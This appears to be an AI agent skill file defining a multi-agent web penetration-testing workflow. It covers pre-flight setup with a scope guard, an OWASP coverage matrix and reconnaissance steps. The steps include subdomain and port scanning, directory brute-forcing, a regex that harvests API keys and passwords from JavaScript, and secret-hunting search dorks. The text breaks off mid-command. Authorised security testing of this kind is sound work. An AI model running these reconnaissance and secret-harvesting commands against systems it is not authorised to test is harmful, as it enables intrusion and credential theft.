---
name: W_HUNT_WEB
description: Comprehensive web application security assessment (OWASP WSTG v4.2/v5 full coverage)
trigger: Web application URL detected
agents: [ReconAgent, AppReviewAgent, AuthAgent, OAuthAgent, XSSAgent, SQLiAgent, NoSQLiAgent, SSRFAgent, IDORAgent, CORSAgent, FileUploadAgent, XXEAgent, RCEAgent, SSTIAgent, CommandInjectionAgent, DeserializationAgent, PathTraversalAgent, OpenRedirectAgent, CRLFAgent, SecretsExposureAgent, BusinessLogicAgent, CSRFAgent, CachePoisoningAgent, HTTPSmugglingAgent, RaceConditionAgent, PrototypePollutionAgent, GraphQLAgent, WebSocketAgent, APIAgent, SubdomainTakeoverAgent, ValidatorAgent, ExploitChainAgent]
tools: [dev-browser, playwright-harness, burp-bridge, credential-vault, auth-manager, hunt-orchestrator, agent-router]
skills_invoked: [WebAssessment, Recon]
---

# W_HUNT_WEB -- Comprehensive Web Application Security Assessment

> **Workflow Owner:** Hunt Orchestrator (`hunt-orchestrator.ts`)
> **Engagement type (agent-router):** `web` (`bun agent-router.ts --engagement web`)
> **Trigger:** Target classified as a web application URL by SecurityHub
> **Estimated Duration:** 3-8 hours (varies with application size, auth complexity, and depth setting)
> **Phases:** 12 sequential methodology phases; the HUNT phases fan out into parallel specialist agents
> **Authority:** OWASP Web Security Testing Guide (WSTG) v4.2/v5 -- full checklist mapped in the Coverage Matrix. OWASP Top 10 2021 (A01-A10) cross-mapped.

---

## Operating Doctrine

This workflow encodes how a seasoned web-application pentest lead actually works. The phases and agents are scaffolding; the mindset below is the load-bearing part. Every agent dispatched by this workflow MUST internalize it.

- **Understand before you attack.** No payload fires until the AppProfile (Phase 2) exists. You cannot test authorization without knowing the role model; you cannot find IDOR without knowing the object graph; you cannot judge a logic flaw without knowing what the business *intends*. Recon and profiling are not warm-up, they are the assessment.
- **Hypothesis-driven, not scanner-driven.** Each technique starts with an explicit hypothesis ("this `id` parameter is a database key reflected without an ownership check"). Automation confirms or kills hypotheses; it never replaces them. A finding you cannot explain mechanically is a finding you cannot defend in triage.
- **Proxy everything.** All HTTP traffic -- manual `curl`, browser, every tool that supports an upstream proxy -- routes through Burp at `http://127.0.0.1:8080`. The proxy history is the canonical record of what was tested, the source for request tampering, the diff engine for blind/boolean bugs, and the evidence trail. Untraced traffic did not happen.
- **Real session, real browser.** Modern apps are SPAs behind JWT/OAuth, CSP, SameSite, and bot defenses. Use `playwright-harness.ts` (dev-browser primary, Playwright fallback) and `auth-manager.ts` for anything stateful or rendered. Raw `curl` is for crisp, isolated request manipulation -- never for crawling a React app or judging DOM XSS.
- **Evidence capture is non-negotiable.** Every probe writes to the run output dir: the request/response pair (Burp history / HAR), a screenshot where rendering matters, the exact payload, and the observed delta. ValidatorAgent must be able to reproduce from artifacts alone.
- **Scope discipline.** The hard scope guard runs before any payload touches any host. Out-of-scope assets discovered during recon are logged and never probed. Third-party CDNs, shared infra, and unlisted subdomains are out unless explicitly in scope. When in doubt, do not test.
- **Depth vs breadth is a deliberate call.** In `bounty` mode, go deep on crown-jewel flows (auth, payment, multi-tenant boundaries, admin) and triage breadth ruthlessly. In `pentest`/`comprehensive` mode, breadth across the full WSTG checklist is the deliverable. The Coverage Matrix is the contract for "nothing material missed".
- **Chain by default.** A reflected value, a permissive CORS policy, and a missing CSRF token are three mediums or one critical account-takeover chain. ExploitChainAgent exists because impact lives in the combination. Hunt for the chain, not just the bug.

---

## Workflow Activation Criteria

The Hunt Orchestrator dispatches `W_HUNT_WEB` when ALL of the following hold:

1. Target is an HTTP/HTTPS URL (not APK, IPA, binary, thick-client, or cloud-only scope).
2. Target responds on initial probe (any of 200/301/302/401/403 -- a 403/401 still means "there is a web app here").
3. The hard scope guard passes for the seed host (`in_scope "$TARGET"` -- defined in Pre-Flight).
4. No existing hunt session is in `running` state for this target (or `--resume` is set).

```bash
# Orchestrator dispatch check (browser UA, follows redirects, no body)
TARGET_TYPE=$(curl -sk -o /dev/null -w "%{http_code}" -A "$UA" -L "$TARGET")
if [[ "$TARGET_TYPE" =~ ^(200|301|302|401|403)$ ]]; then
  echo "DISPATCH: W_HUNT_WEB"
  bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --mode "$HUNT_MODE"
  bun "$TOOLS/agent-router.ts" --engagement web --max-parallel 5   # prints the canonical deployment plan
fi
```

---

## Pre-Flight

Pre-Flight wires the lab and loads identities. Nothing in Phases 1-12 runs until every row below is green. This is the single place where proxy, UA, output dir, credentials, multi-identity, and the scope guard are established; downstream phases assume them.

### PF.1 Environment and run output dir

```bash
# --- Target identity ---
export TARGET="https://app.example.com"
export TARGET_DOMAIN="example.com"
export TARGET_SLUG="app-example-com"
export PROGRAM_NAME="HackerOne - ExampleCorp"
export HUNT_MODE="bounty"               # bounty | pentest | comprehensive

# --- Proxy + browser identity (EVERY request rides this) ---
export BURP_PROXY="http://127.0.0.1:8080"
export BURP_API="http://127.0.0.1:1337/v0.1"
export UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

# --- Tools + run output dir (ALL artifacts land here; matches hunt-orchestrator.ts session layout) ---
export TOOLS=~/.claude/skills/BugBountyFramework/Tools
export RUN_DIR=~/.claude/MEMORY/BugBounty/Sessions/${TARGET_SLUG}
export FINDINGS_DIR=$RUN_DIR/findings
export EVIDENCE_DIR=$RUN_DIR/screenshots
export ARTIFACTS_DIR=$RUN_DIR/artifacts        # raw req/resp, HAR, tool output
export RECON_DIR=$RUN_DIR/recon                 # ReconWorkflow hand-off lands here
mkdir -p "$FINDINGS_DIR" "$EVIDENCE_DIR" "$ARTIFACTS_DIR" "$RECON_DIR"

# --- Out-of-band (Burp Collaborator preferred; interactsh fallback) ---
export COLLAB="$(bun "$TOOLS/burp-bridge.ts" --collaborator-poll --poll-max 1 2>/dev/null | jq -r '.host // empty' | head -1)"
[ -z "$COLLAB" ] && export COLLAB="$(interactsh-client -json 2>/dev/null | jq -r '.host' | head -1)"
```

### PF.2 Proxy-aware request helper

Every manual probe in this workflow uses `bb` so it is routed through Burp, carries a browser UA, and is captured in proxy history. Use `bb_save` when you also want the raw transcript on disk.

```bash
# Proxy-aware curl: through Burp, browser UA, silent, insecure (intercept TLS), follow redirects
bb() { curl -sk --proxy "$BURP_PROXY" -A "$UA" "$@"; }

# Same, but dump the full request+response transcript to the artifacts dir
bb_save() {
  local tag="$1"; shift
  curl -sk --proxy "$BURP_PROXY" -A "$UA" -D "$ARTIFACTS_DIR/${tag}.headers" \
    -o "$ARTIFACTS_DIR/${tag}.body" -w "%{http_code} %{time_total}s %{size_download}b\n" "$@" \
    | tee -a "$ARTIFACTS_DIR/${tag}.meta"
}
```

### PF.3 Burp wiring and scope sync

```bash
# Confirm proxy + REST API are live (warn, do not block, if down)
bun "$TOOLS/burp-bridge.ts" --health || echo "[WARN] Burp down -- manual probes capture nothing; bring it up if possible"

# Mirror engagement scope into Burp Target scope so out-of-scope traffic is dropped at the proxy
bun "$TOOLS/burp-bridge.ts" --sync-scope --scope "*.$TARGET_DOMAIN,$TARGET_DOMAIN"
```

### PF.4 Hard scope guard

The guard is the last line before any payload. `scope.txt` holds one allowed host or `*.suffix` pattern per line; populate it from the program policy (or reuse ReconWorkflow's `recon/scope/` output).

```bash
# Author the allow-list from the program's in-scope assets (one per line; "*." prefix allowed)
cat > "$RUN_DIR/scope.txt" <<'EOF'
*.example.com
example.com
EOF

# Hard scope guard -- returns 0 only if the URL's host is explicitly allowed.
# Every agent MUST call this before testing ANY discovered asset.
in_scope() {
  local host; host=$(printf '%s' "$1" | sed -E 's#^[a-z]+://##i; s#[/:].*$##')
  while read -r pat; do
    [ -z "$pat" ] && continue
    case "$host" in
      ${pat/\*./*.}) return 0 ;;
      "$pat") return 0 ;;
    esac
  done < "$RUN_DIR/scope.txt"
  echo "[SCOPE] OUT OF SCOPE (skipped): $host" >> "$RUN_DIR/out-of-scope.log"
  return 1
}
```

### PF.5 Multi-identity credential setup

Authorization, IDOR/BOLA, and privilege-escalation testing are impossible with a single identity. Provision at least two same-tenant low-priv users plus one admin, keyed in the vault by suffix. Never inline secrets in this file or in logs.

```bash
# Store identities (values pulled from program test creds or 1Password via --op-item)
bun "$TOOLS/credential-vault.ts" --store --target "${TARGET_SLUG}-userA" --op-item "exco-test-userA"
bun "$TOOLS/credential-vault.ts" --store --target "${TARGET_SLUG}-userB" --op-item "exco-test-userB"
bun "$TOOLS/credential-vault.ts" --store --target "${TARGET_SLUG}-admin" --op-item "exco-test-admin"

# Authenticate each identity via the real browser flow and persist storage state
for ID in userA userB admin; do
  bun "$TOOLS/auth-manager.ts" --target "$TARGET" --authenticate \
    --strategy basic --creds-from "vault:${TARGET_SLUG}-${ID}" \
    --proxy "$BURP_PROXY" --save-state --headless
done

# Materialize per-identity cookies for raw request manipulation (parse JSON; vault has no --field)
export COOKIE_A=$(bun "$TOOLS/credential-vault.ts" --get --target "${TARGET_SLUG}-userA" | jq -r '.cookie // empty')
export COOKIE_B=$(bun "$TOOLS/credential-vault.ts" --get --target "${TARGET_SLUG}-userB" | jq -r '.cookie // empty')
export COOKIE_ADMIN=$(bun "$TOOLS/credential-vault.ts" --get --target "${TARGET_SLUG}-admin" | jq -r '.cookie // empty')
export SESSION_COOKIE="$COOKIE_A"     # default working identity = low-priv user A
export KNOWN_VALID_USER="userA@example.com"
```

### PF.6 Pre-Flight gate

| Check | Command | Pass condition |
|-------|---------|----------------|
| Target reachable | `bb -o /dev/null -w "%{http_code}" -L "$TARGET"` | HTTP response received |
| Scope guard armed | `in_scope "$TARGET" && echo OK` | Prints `OK` |
| Burp proxy | `bun $TOOLS/burp-bridge.ts --health` | Alive (warn-only if down) |
| Scope synced to Burp | `bun $TOOLS/burp-bridge.ts --sync-scope --scope ...` | Patterns imported |
| Identities authenticated | `auth-manager --target "$TARGET" --check` per id | At least userA + userB valid |
| Output dir | `ls -d "$FINDINGS_DIR" "$ARTIFACTS_DIR"` | Directories exist |
| OOB channel | `echo "$COLLAB"` | Non-empty Collaborator/interactsh host |
| Orchestrator session | `bun $TOOLS/hunt-orchestrator.ts --target "$TARGET" --status` | No conflicting `running` session |

Start (or resume) the state machine, then proceed:

```bash
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --mode "$HUNT_MODE"
# Each phase Gate-out calls:   bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --advance
# Each confirmed finding calls: bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --add-finding '{...}'
```

## Coverage Matrix

Authoritative mapping of OWASP WSTG v4.2/v5 to the phase/technique that covers it and the owning specialist agent. If a WSTG item is not green here, the assessment is incomplete. Phase IDs are `P<n>.<technique>`.

### WSTG -> Phase / Agent

| WSTG ID | Test | Phase.Technique | Agent |
|---------|------|-----------------|-------|
| WSTG-INFO-01 | Search engine discovery / recon | P1.7 | ReconAgent |
| WSTG-INFO-02 | Fingerprint web server | P1.3 | ReconAgent |
| WSTG-INFO-03 | Review webserver metafiles (robots, sitemap, security.txt, .well-known) | P1.8 | ReconAgent |
| WSTG-INFO-04 | Enumerate applications on webserver (vhosts, ports) | P1.2, P1.6 | ReconAgent |
| WSTG-INFO-05 | Review webpage content for information leakage (JS/comments) | P1.5 | ReconAgent, SecretsExposureAgent |
| WSTG-INFO-06 | Identify application entry points | P1.4, P2.4 | ReconAgent, AppReviewAgent |
| WSTG-INFO-07 | Map execution paths through application | P2.2 | AppReviewAgent |
| WSTG-INFO-08 | Fingerprint web application framework | P1.3, P2.3 | ReconAgent, AppReviewAgent |
| WSTG-INFO-09 | Fingerprint web application | P2.3 | AppReviewAgent |
| WSTG-INFO-10 | Map application architecture / trust boundaries | P2.5, P2.6 | AppReviewAgent |
| WSTG-CONF-01 | Network/infrastructure configuration | P3.1 | AppReviewAgent |
| WSTG-CONF-02 | Application platform configuration | P3.1 | AppReviewAgent |
| WSTG-CONF-03 | File extension handling for sensitive info | P3.2 | SecretsExposureAgent |
| WSTG-CONF-04 | Old/backup/unreferenced/source files | P3.3 | SecretsExposureAgent |
| WSTG-CONF-05 | Admin interfaces enumeration | P3.4 | AppReviewAgent |
| WSTG-CONF-06 | HTTP methods (incl. verb tampering) | P3.5 | AppReviewAgent |
| WSTG-CONF-07 | HTTP Strict Transport Security (HSTS) | P3.6 | AppReviewAgent |
| WSTG-CONF-08 | RIA cross-domain policy (crossdomain.xml, clientaccesspolicy) | P3.7 | CORSAgent |
| WSTG-CONF-09 | File permission | P3.3 | SecretsExposureAgent |
| WSTG-CONF-10 | Subdomain takeover | P9.4 | SubdomainTakeoverAgent |
| WSTG-CONF-11 | Cloud storage (open buckets) | P3.8 | SecretsExposureAgent |
| WSTG-IDNT-01 | Role definitions | P2.6, P6.0 | AppReviewAgent, IDORAgent |
| WSTG-IDNT-02 | User registration process | P4.1 | AuthAgent |
| WSTG-IDNT-03 | Account provisioning process | P4.1 | AuthAgent |
| WSTG-IDNT-04 | Account enumeration / guessable accounts | P4.2 | AuthAgent |
| WSTG-IDNT-05 | Weak/unenforced username policy | P4.3 | AuthAgent |
| WSTG-ATHN-01 | Credentials over encrypted channel | P3.6, P4.4 | AuthAgent |
| WSTG-ATHN-02 | Default credentials | P4.5 | AuthAgent |
| WSTG-ATHN-03 | Weak lockout mechanism | P4.6 | AuthAgent |
| WSTG-ATHN-04 | Bypassing authentication schema | P4.7 | AuthAgent |
| WSTG-ATHN-05 | Vulnerable remember-password | P4.8 | AuthAgent |
| WSTG-ATHN-06 | Browser cache weaknesses | P4.9 | AuthAgent |
| WSTG-ATHN-07 | Weak password policy | P4.3 | AuthAgent |
| WSTG-ATHN-08 | Weak security question/answer | P4.10 | AuthAgent |
| WSTG-ATHN-09 | Weak password change/reset | P4.11 | AuthAgent |
| WSTG-ATHN-10 | Weaker auth in alternative channel | P4.12 | AuthAgent |
| WSTG-ATHN-* | MFA bypass | P4.13 | AuthAgent |
| WSTG-ATHZ-01 | Directory traversal / file include | P6.4 | PathTraversalAgent |
| WSTG-ATHZ-02 | Bypassing authorization schema | P6.2 | IDORAgent |
| WSTG-ATHZ-03 | Privilege escalation (horizontal/vertical) | P6.3 | IDORAgent |
| WSTG-ATHZ-04 | Insecure Direct Object References (IDOR/BOLA) | P6.1 | IDORAgent |
| WSTG-ATHZ-05 | OAuth/OIDC weaknesses | P4.14 | OAuthAgent |
| WSTG-SESS-01 | Session management schema | P5.1 | AuthAgent |
| WSTG-SESS-02 | Cookie attributes | P5.2 | AuthAgent |
| WSTG-SESS-03 | Session fixation | P5.3 | AuthAgent |
| WSTG-SESS-04 | Exposed session variables | P5.4 | AuthAgent |
| WSTG-SESS-05 | Cross-Site Request Forgery (CSRF) | P8.5 | CSRFAgent |
| WSTG-SESS-06 | Logout functionality | P5.5 | AuthAgent |
| WSTG-SESS-07 | Session timeout | P5.6 | AuthAgent |
| WSTG-SESS-08 | Session puzzling | P5.7 | AuthAgent |
| WSTG-SESS-09 | Session hijacking / concurrent sessions | P5.8 | AuthAgent |
| WSTG-SESS-* | JWT testing | P5.9 | AuthAgent |
| WSTG-INPV-01 | Reflected XSS | P8.1 | XSSAgent |
| WSTG-INPV-02 | Stored XSS | P8.1 | XSSAgent |
| WSTG-INPV-03 | HTTP verb tampering | P3.5 | AppReviewAgent |
| WSTG-INPV-04 | HTTP parameter pollution (HPP) | P7.9 | CommandInjectionAgent |
| WSTG-INPV-05 | SQL injection | P7.1 | SQLiAgent |
| WSTG-INPV-05b | NoSQL injection | P7.2 | NoSQLiAgent |
| WSTG-INPV-06 | LDAP injection | P7.3 | SQLiAgent |
| WSTG-INPV-07 | XML injection / XXE | P7.4 | XXEAgent |
| WSTG-INPV-08 | SSI injection | P7.5 | SSTIAgent |
| WSTG-INPV-09 | XPath injection | P7.3 | SQLiAgent |
| WSTG-INPV-10 | IMAP/SMTP injection | P7.6 | CommandInjectionAgent |
| WSTG-INPV-11 | Code injection (incl. LFI/RFI) | P7.7 | RCEAgent |
| WSTG-INPV-12 | OS command injection | P7.8 | CommandInjectionAgent |
| WSTG-INPV-13 | Format string injection | P7.10 | RCEAgent |
| WSTG-INPV-14 | Incubated vulnerability | P7.11 | RCEAgent |
| WSTG-INPV-15 | HTTP splitting / smuggling | P9.3 | HTTPSmugglingAgent, CRLFAgent |
| WSTG-INPV-16 | HTTP incoming requests / host header injection | P9.5 | CRLFAgent |
| WSTG-INPV-17 | Server-Side Template Injection (SSTI) | P7.12 | SSTIAgent |
| WSTG-INPV-18 | Server-Side Request Forgery (SSRF) | P9.1 | SSRFAgent |
| WSTG-INPV-* | Insecure deserialization | P7.13 | DeserializationAgent |
| WSTG-INPV-* | CRLF / response splitting | P7.14, P9.5 | CRLFAgent |
| WSTG-ERRH-01 | Improper error handling | P3.9 | AppReviewAgent |
| WSTG-ERRH-02 | Stack traces | P3.9 | AppReviewAgent |
| WSTG-CRYP-01 | Weak TLS | P3.10 | AppReviewAgent |
| WSTG-CRYP-02 | Padding oracle | P3.11 | AppReviewAgent |
| WSTG-CRYP-03 | Sensitive info over unencrypted channel | P3.6, P3.10 | AppReviewAgent |
| WSTG-CRYP-04 | Weak encryption / weak randomness | P3.11, P5.9 | AppReviewAgent |
| WSTG-BUSL-01 | Business logic data validation | P10.1 | BusinessLogicAgent |
| WSTG-BUSL-02 | Ability to forge requests | P10.2 | BusinessLogicAgent |
| WSTG-BUSL-03 | Integrity checks | P10.3 | BusinessLogicAgent |
| WSTG-BUSL-04 | Process timing | P10.4 | RaceConditionAgent |
| WSTG-BUSL-05 | Function-use limits | P10.5 | BusinessLogicAgent, RaceConditionAgent |
| WSTG-BUSL-06 | Circumvention of workflows | P10.6 | BusinessLogicAgent |
| WSTG-BUSL-07 | Defenses against application misuse | P10.7 | BusinessLogicAgent |
| WSTG-BUSL-08 | Upload of unexpected file types | P10.8 | FileUploadAgent |
| WSTG-BUSL-09 | Upload of malicious files | P10.9 | FileUploadAgent |
| WSTG-CLNT-01 | DOM-based XSS | P8.2 | XSSAgent |
| WSTG-CLNT-02 | JavaScript execution | P8.2 | XSSAgent |
| WSTG-CLNT-03 | HTML injection | P8.3 | XSSAgent |
| WSTG-CLNT-04 | Client-side URL redirect (open redirect) | P8.4 | OpenRedirectAgent |
| WSTG-CLNT-05 | CSS injection | P8.6 | XSSAgent |
| WSTG-CLNT-06 | Client-side resource manipulation | P8.7 | PrototypePollutionAgent |
| WSTG-CLNT-07 | Cross-Origin Resource Sharing (CORS) | P8.8 | CORSAgent |
| WSTG-CLNT-08 | Cross-site flashing | P8.9 | XSSAgent |
| WSTG-CLNT-09 | Clickjacking | P8.10 | CSRFAgent |
| WSTG-CLNT-10 | WebSockets (incl. CSWSH) | P8.11, P11.2 | WebSocketAgent |
| WSTG-CLNT-11 | Web messaging (postMessage) | P8.12 | XSSAgent |
| WSTG-CLNT-12 | Browser storage | P8.13 | XSSAgent, SecretsExposureAgent |
| WSTG-CLNT-13 | Cross-site script inclusion (XSSI) / prototype pollution | P8.7, P8.14 | PrototypePollutionAgent |
| WSTG-APIT-01 | API reconnaissance | P2.7, P11.3 | APIAgent |
| WSTG-APIT-* | GraphQL testing | P11.1 | GraphQLAgent |
| Extra | Web cache poisoning / deception | P9.2 | CachePoisoningAgent |
| Extra | HTTP request smuggling (CL.TE/TE.CL/H2) | P9.3 | HTTPSmugglingAgent |

### OWASP Top 10 2021 -> Phase

| ID | Category | Primary phases |
|----|----------|----------------|
| A01 | Broken Access Control | P6 (all), P5.5/5.6, P8.8 |
| A02 | Cryptographic Failures | P3.6, P3.10, P3.11, P5.9 |
| A03 | Injection | P7 (all), P8.1-8.3 |
| A04 | Insecure Design | P10 (all), P2.5/2.6 |
| A05 | Security Misconfiguration | P3 (all), P3.4, P8.8, P8.10 |
| A06 | Vulnerable and Outdated Components | P1.3, P2.3, P3.1 |
| A07 | Identification and Authentication Failures | P4 (all), P5 (all) |
| A08 | Software and Data Integrity Failures | P7.13, P10.3, P9.3 |
| A09 | Security Logging and Monitoring Failures | P10.7, lockout/rate-limit across P4.6/P10.5 |
| A10 | Server-Side Request Forgery | P9.1 |

---

## Phase 1: RECONNAISSANCE & INFORMATION GATHERING

**Objective:** Build the complete external attack surface and intelligence picture (WSTG-INFO-01..10) so profiling and every hunter operate against the full footprint, not just the seed URL.
**Expert rationale:** Bugs live where the defenders forgot they had assets -- a legacy subdomain, an unreferenced backup, an endpoint only named in a minified JS bundle. Recon is where you out-enumerate the blue team.
**Gate-in:** Pre-Flight green; `in_scope "$TARGET"` true; orchestrator session started. If ReconWorkflow already ran, consume its hand-off from `$RECON_DIR/reports/handoff-notes.md` (the `-> W_WEB` section), `$RECON_DIR/reports/attack-surface-inventory.json`, and `$RECON_DIR/reports/high-priority-targets.txt` instead of re-enumerating.
**Agent:** ReconAgent.
**Parallelizable:** 1.1-1.7 run concurrently; 1.8 depends on 1.4 output.

### 1.1 Subdomain enumeration (WSTG-INFO-04)

- **Objective / hypothesis:** The program's real surface is larger than the seed host; forgotten subdomains carry weaker config and stale code.
- **Procedure:**
```bash
# Prefer the ReconWorkflow hand-off inventory; else enumerate
if [ -f "$RECON_DIR/reports/attack-surface-inventory.json" ]; then
  jq -r '.web.subdomains[]? // .subdomains[]?' "$RECON_DIR/reports/attack-surface-inventory.json" | sort -u > "$RECON_DIR/all-subs.txt"
else
  subfinder -d "$TARGET_DOMAIN" -silent -all -o "$RECON_DIR/subs-subfinder.txt" &
  assetfinder --subs-only "$TARGET_DOMAIN" > "$RECON_DIR/subs-assetfinder.txt" &
  amass enum -passive -d "$TARGET_DOMAIN" -o "$RECON_DIR/subs-amass.txt" 2>/dev/null &
  wait
  cat "$RECON_DIR"/subs-*.txt | sort -u > "$RECON_DIR/all-subs.txt"
fi
# Scope-filter every discovered host BEFORE anything is probed
while read -r s; do in_scope "$s" && echo "$s"; done < "$RECON_DIR/all-subs.txt" > "$RECON_DIR/subs-in-scope.txt"
wc -l "$RECON_DIR/subs-in-scope.txt"
```
- **Indicators:** New in-scope hostnames not in the original brief; dev/staging/uat/internal naming.
- **Validation:** Resolve and confirm each is in scope; discard wildcard-DNS false positives (`dnsx -resp -a`).
- **Evasion / edge cases:** Passive-only when active DNS is noisy/forbidden; honor rate limits; never brute-force DNS of out-of-scope parents.
- **Severity:** Informational (feeds everything downstream).
- **Dispatch:** -> ReconAgent

### 1.2 Port & service discovery (WSTG-INFO-04)

- **Objective / hypothesis:** Web apps hide on non-standard ports (8080/8443/3000/9000); admin panels and debug servers especially.
- **Procedure:**
```bash
naabu -list "$RECON_DIR/subs-in-scope.txt" -silent -top-ports 1000 -rate 1000 -o "$RECON_DIR/ports.txt"
grep -vE ":(80|443)$" "$RECON_DIR/ports.txt" > "$RECON_DIR/non-standard-ports.txt"
```
- **Indicators:** Open management ports; databases exposed; web servers on odd ports.
- **Validation:** Probe each open port for an HTTP banner before claiming "web app".
- **Evasion / edge cases:** Lower rate behind WAF/IDS; chunk scans; respect program "no port scan" clauses.
- **Severity:** Informational to Medium (exposed admin/debug service).
- **Dispatch:** -> ReconAgent

### 1.3 Web server & framework fingerprinting (WSTG-INFO-02, -08)

- **Objective / hypothesis:** Identify server, framework, language, WAF, CDN -- this selects which injection/template payloads are even plausible (A06).
- **Procedure:**
```bash
# httpx through Burp so probes are logged; tech-detect + titles + status
cat "$RECON_DIR/subs-in-scope.txt" | httpx -silent -status-code -title -tech-detect -json \
  -follow-redirects -threads 50 -H "User-Agent: $UA" -http-proxy "$BURP_PROXY" \
  -o "$RECON_DIR/alive-hosts.json"
jq -r '.url' "$RECON_DIR/alive-hosts.json" | sort -u > "$RECON_DIR/alive-urls.txt"
whatweb --input-file="$RECON_DIR/alive-urls.txt" --aggression 3 \
  --log-json="$RECON_DIR/whatweb.json" --user-agent "$UA" --proxy "$BURP_PROXY" 2>/dev/null
```
- **Indicators:** `Server`/`X-Powered-By` headers, framework cookies (`JSESSIONID`, `laravel_session`, `connect.sid`), WAF fingerprints (`cf-ray`, `x-sucuri-id`).
- **Validation:** Cross-check two sources (httpx + whatweb); reuse ReconWorkflow `tech/framework-paths.txt` if present.
- **Evasion / edge cases:** WAF may strip identifying headers -- infer from error pages and 404 bodies.
- **Severity:** Informational (drives payload selection).
- **Dispatch:** -> ReconAgent

### 1.4 URL discovery & entry points (WSTG-INFO-06)

- **Objective / hypothesis:** Historical and crawled URLs reveal parameters and endpoints that are the actual injection surface.
- **Procedure:**
```bash
GAU_BIN="${HOME}/go/bin/gau"
( cat "$RECON_DIR/subs-in-scope.txt" | while read -r sub; do
    "$GAU_BIN" "$sub" 2>/dev/null; waybackurls "$sub" 2>/dev/null
  done ) | sort -u | grep -vE "\.(jpg|jpeg|png|gif|svg|ico|css|woff|ttf|eot|mp4|pdf)$" \
  > "$RECON_DIR/historical-urls.txt"
# Active crawl through Burp so the sitemap fills
katana -u "$TARGET" -d 5 -jc -kf -ef css,png,jpg,gif,svg,ico,woff,ttf \
  -H "User-Agent: $UA" -proxy "$BURP_PROXY" -silent -o "$RECON_DIR/katana-urls.txt"
cat "$RECON_DIR/historical-urls.txt" "$RECON_DIR/katana-urls.txt" \
    "$RECON_DIR/content/params-from-urls.txt" 2>/dev/null | sort -u > "$RECON_DIR/all-urls.txt"
grep "?" "$RECON_DIR/all-urls.txt" | sort -u > "$RECON_DIR/param-urls.txt"   # injection candidate set
```
- **Indicators:** Distinct parameter names; legacy paths; API routes; debug/test endpoints.
- **Validation:** De-dup parameters with `uro`/`qsreplace`; confirm endpoints live before handing to hunters.
- **Evasion / edge cases:** Authenticated crawl happens in Phase 2 -- this pass is unauth surface.
- **Severity:** Informational.
- **Dispatch:** -> ReconAgent

### 1.5 Content & JS leakage review (WSTG-INFO-05)

- **Objective / hypothesis:** Minified bundles and HTML comments leak endpoints, keys, internal hostnames, and feature flags (A02/A05).
- **Procedure:**
```bash
grep -E "\.js(\?|$)" "$RECON_DIR/all-urls.txt" | httpx -silent -mc 200 \
  -H "User-Agent: $UA" -http-proxy "$BURP_PROXY" > "$RECON_DIR/js-files.txt"
while read -r jsurl; do python3 linkfinder.py -i "$jsurl" -o cli 2>/dev/null; done \
  < "$RECON_DIR/js-files.txt" | sort -u > "$RECON_DIR/js/js-endpoints.txt" 2>/dev/null || \
  ( mkdir -p "$RECON_DIR/js"; while read -r jsurl; do python3 linkfinder.py -i "$jsurl" -o cli 2>/dev/null; done < "$RECON_DIR/js-files.txt" | sort -u > "$RECON_DIR/js/js-endpoints.txt" )
while read -r jsurl; do
  bb "$jsurl" | grep -oEi \
   "(api[_-]?key|apikey|secret|token|password|aws_access|firebase|stripe|private[_-]?key)['\"[:space:]:=]+['\"][A-Za-z0-9/+=_-]{16,}"
done < "$RECON_DIR/js-files.txt" > "$RECON_DIR/leaks/js-secrets.txt" 2>/dev/null || true
```
- **Indicators:** Live-looking credentials, internal URLs, hidden endpoints, source maps (`.js.map`).
- **Validation:** Test each candidate secret cautiously, in scope, before reporting; pull `.map` files to recover source.
- **Evasion / edge cases:** Beware honeytokens; many "keys" are publishable client IDs -- confirm privilege.
- **Severity:** Low to Critical (live secret).
- **Dispatch:** -> ReconAgent, SecretsExposureAgent

### 1.6 Content & parameter brute-force (WSTG-INFO-04, -06)

- **Objective / hypothesis:** Unlinked directories, admin paths, and hidden parameters expand the surface beyond what is crawlable.
- **Procedure:**
```bash
ffuf -u "$TARGET/FUZZ" -w ~/.claude/skills/BugBountyFramework/Wordlists/critical-paths.txt \
  -mc 200,201,204,301,302,307,401,403,405 -H "User-Agent: $UA" -x "$BURP_PROXY" \
  -t 50 -rate 100 -of json -o "$RECON_DIR/ffuf-dirs.json"
ffuf -u "$TARGET/api/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,301,302,401,403,405 -H "User-Agent: $UA" -x "$BURP_PROXY" -t 50 -of json \
  -o "$RECON_DIR/ffuf-api.json"
arjun -u "$TARGET" --proxy "$BURP_PROXY" -oJ "$RECON_DIR/arjun-params.json" 2>/dev/null
```
- **Indicators:** 200/401/403 on sensitive names; parameters that change responses.
- **Validation:** Calibrate against a random path to filter soft-404s; confirm 403s are real ACLs (see P6).
- **Evasion / edge cases:** Rotate wordlists by detected stack; throttle to avoid WAF bans.
- **Severity:** Informational to High (exposed admin/API).
- **Dispatch:** -> ReconAgent

### 1.7 Search-engine & OSINT discovery (WSTG-INFO-01)

- **Objective / hypothesis:** Indexed leaks (configs, dumps, repos) hand you findings for free.
- **Procedure:**
```bash
DORKS=(
 "site:$TARGET_DOMAIN ext:sql|env|log|bak|old|backup"
 "site:$TARGET_DOMAIN inurl:admin|api|debug|test|config|setup|install"
 "site:$TARGET_DOMAIN intitle:\"index of\""
 "site:$TARGET_DOMAIN inurl:login|signin|sso|oauth"
 "\"$TARGET_DOMAIN\" password|secret|api_key site:github.com"
)
printf '%s\n' "${DORKS[@]}" > "$RECON_DIR/google-dorks.txt"
trufflehog github --org="$(echo $TARGET_DOMAIN | cut -d. -f1)" --json 2>/dev/null > "$RECON_DIR/leaks/trufflehog.json"
```
- **Indicators:** Indexed sensitive files; committed secrets; exposed dashboards.
- **Validation:** Manually open each hit; verify it belongs to the in-scope org.
- **Evasion / edge cases:** Dork results need human review -- automate collection, not conclusions.
- **Severity:** Informational to Critical.
- **Dispatch:** -> ReconAgent, SecretsExposureAgent

### 1.8 Webserver metafiles & well-known (WSTG-INFO-03)

- **Objective / hypothesis:** `robots.txt`, sitemaps, and `.well-known/` advertise hidden paths, security contacts, and policy endpoints.
- **Procedure:**
```bash
for f in robots.txt sitemap.xml security.txt humans.txt ads.txt \
         .well-known/security.txt .well-known/openid-configuration \
